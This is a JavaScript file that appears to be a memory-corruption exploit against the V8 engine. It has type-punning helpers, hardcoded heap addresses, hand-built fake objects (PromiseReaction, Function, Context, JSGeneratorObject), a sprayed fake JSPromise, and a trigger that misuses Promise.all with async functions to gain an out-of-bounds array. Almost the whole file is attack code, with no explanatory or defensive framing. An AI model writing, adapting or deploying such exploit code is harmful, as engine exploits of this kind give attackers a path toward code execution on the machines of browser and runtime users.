function assert(val) {
    if (!val)
        throw "Assertion Failed";
}

class Helpers {
    constructor() {
        this.buf = new ArrayBuffer(8);
        this.dv = new DataView(this.buf);
        this.u8 = new Uint8Array(this.buf);
        this.u32 = new Uint32Array(this.buf);
        this.u64 = new BigUint64Array(this.buf);
        this.f32 = new Float32Array(this.buf);
        this.f64 = new Float64Array(this.buf);
        this.index = 0;
    }

    pair_i32_to_f64(p1, p2) {
        this.u32[0] = p1;
        this.u32[1] = p2;
        return this.f64[0];
    }

    i64tof64(i) {
        this.u64[0] = i;
        return this.f64[0];
    }

    f64toi64(f) {
        this.f64[0] = f;
        return this.u64[0];
    }

    set_i64(i) {
        this.u64[0] = i;
    }

    set_l(i) {
        this.u32[0] = i;
    }

    set_h(i) {
        this.u32[1] = i;
    }

    get_i64() {
        return this.u64[0];
    }

    ftoil(f) {
        this.f64[0] = f;
        return this.u32[0]
    }

    ftoih(f) {
        this.f64[0] = f;
        return this.u32[1]
    }

    mark_sweep_gc() {
        new ArrayBuffer(0x7fe00000);
    }

    scavenge_gc() {
        for (var i = 0; i < 8; i++) {
            this.add_ref(new ArrayBuffer(0x200000));
        }
        this.add_ref(new ArrayBuffer(8));
    }
    trap() {
        while (1) {
        }
    }
}

var helper = new Helpers();

function hex(x) {
    return `0x${x.toString(16)}`;
}

const sloppy_func_addr = 0x04eb61;
const fake_objs_elems_addr = 0x004ec4d;
const oob_arr_draft_elem_addr = 0x04ecd5;

const sloppy_func = () => {};
// %DebugPrint(sloppy_func);

const fake_objs = new Array(
    /* +0x08 */ helper.pair_i32_to_f64(0x0018ed75, 0x00000219), // OOB array
    /* +0x10 */ helper.pair_i32_to_f64(oob_arr_draft_elem_addr, 0x42424242),
    /* +0x18 */ helper.pair_i32_to_f64(0x000013cd, 0x00000000), // PromiseReaction
    /* +0x20 */ helper.pair_i32_to_f64(0x00000251, fake_objs_elems_addr + 0x30),
    /* +0x28 */ helper.pair_i32_to_f64(0x00000251, 0x00000251),
    /* +0x30 */ helper.pair_i32_to_f64(0x001843bd, 0x00000219), // Function
    /* +0x38 */ helper.pair_i32_to_f64(0x00000219, 0x00043c80),
    /* +0x40 */ helper.pair_i32_to_f64(0x00025575, fake_objs_elems_addr + 0x48),
    /* +0x48 */ helper.pair_i32_to_f64(0x00191895, 0x43434343), // Context
    /* +0x50 */ helper.pair_i32_to_f64(0x45454545, 0x47474747),
    /* +0x58 */ helper.pair_i32_to_f64(fake_objs_elems_addr + 0x60, 0x0),
    /* +0x60 */ helper.pair_i32_to_f64(0x0019beed, 0x00000219), // JSGeneratorObject
    /* +0x68 */ helper.pair_i32_to_f64(0x00000219, sloppy_func_addr),
    /* +0x70 */ helper.pair_i32_to_f64(0x0019190d, fake_objs_elems_addr + 0x8),
    /* +0x78 */ helper.pair_i32_to_f64(0x41414141, 0xdeadbeef),
    /* +0x80 */ helper.pair_i32_to_f64(0x00000000, 0x23232323),
);
// %DebugPrint(fake_objs);

const oob_arr_draft = [1.1,];
// %DebugPrint(oob_arr_draft);

// Spray JSPromise
const jspromise = [
    helper.pair_i32_to_f64(0x0, 0x0018b5a9 << 8),
    helper.pair_i32_to_f64(0x00000219 << 8, 0x00000219 << 8),
    helper.pair_i32_to_f64((fake_objs_elems_addr + 0x18) << 8, 0x0),
];
// %DebugPrint(jspromise);

var xx = new Array(1.1, 1.2);
for (let i = 0; i < 0xcc00; i++) {
    xx.push(jspromise[0]);
    xx.push(jspromise[1]);
    xx.push(jspromise[2]);
}
// %DebugPrint(xx);
var xx2 = new Array(1.1, 1.2);
for (let i = 0; i < 0xc00; i++) {
    xx2.push(jspromise[0]);
    xx2.push(jspromise[1]);
    xx2.push(jspromise[2]);
}
// %DebugPrint(xx2);
var xx3 = new Array(1.1, 1.2);
for (let i = 0; i < 0x400; i++) {
    xx3.push(jspromise[0]);
    xx3.push(jspromise[1]);
    xx3.push(jspromise[2]);
}
// %DebugPrint(xx3);

var oob_arr;

function trigger() {

    var closure;

    function Constructor(executor) {
        executor(()=>{}, ()=>{});
    }
    Constructor.resolve = function(v) {
        return v;
    };

    let p1 = {
        then(onFul, onRej) {
            closure = onFul;
            closure(1);
            // %DebugPrint(closure);
        }
    };

    async function foo() {
        await Promise.all.call(Constructor, [p1]);
        await bar(1);
    }

    async function bar(x) {
        await x;
        throw new Error("Let's have a look...");
    }

    foo()
        .then(closure)
        .catch(e => console.log(e.stack));

}

trigger();
